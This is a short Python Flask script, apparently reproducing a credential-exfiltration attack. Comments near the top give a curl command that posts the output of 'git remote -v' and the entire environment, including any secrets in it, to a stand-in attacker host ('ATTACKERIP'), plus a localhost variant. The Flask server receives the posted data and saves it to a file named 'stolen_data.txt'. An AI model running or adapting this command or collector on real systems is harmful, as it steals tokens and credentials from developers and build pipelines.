from flask import Flask, request

# ORIGINAL COMMAND:
# curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://ATTACKERIP/upload/v2 || true
#
# COMMAND TO USE WITH FLASK SERVER:
# curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://127.0.0.1:5000/ || true


app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def receive_data():
    print("RECEIVING....")

    form_dict = request.form.to_dict()
    filename = 'stolen_data.txt'
    with open(filename, 'w') as file:
        for key, value in form_dict.items():
            print("KEY:\n\n", key, "\n\nVALUE:\n\n", value)
            file.write('{}\n\n{}\n\n\n'.format(key, value))

    print("\nDONE")
    return 'Data received successfully!\n'

if __name__ == '__main__':
    app.run()
    